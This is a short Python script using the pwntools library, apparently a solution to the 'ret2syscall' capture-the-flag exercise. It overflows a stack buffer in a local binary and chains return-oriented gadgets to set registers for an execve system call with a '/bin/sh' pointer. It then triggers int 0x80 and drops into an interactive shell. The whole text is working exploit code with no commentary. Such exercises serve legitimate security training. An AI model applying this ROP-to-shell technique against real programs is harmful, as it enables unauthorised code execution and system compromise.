
from pwn import *

p=process('./ret2syscall')

offset = 0x6c+4

add_eax=p32(0x080bb196)
value_eax=p32(0xb) 

add_edx_ecx_ebx=p32(0x0806eb90)
value_ebx=p32(0x080be408)
value_ecx=p32(0)
value_edx=p32(0)

add_int=p32(0x08049421)

payload =offset*b'A'+add_eax+value_eax+add_edx_ecx_ebx+value_edx+value_ecx+value_ebx+add_int
p.sendline(payload)
p.interactive()
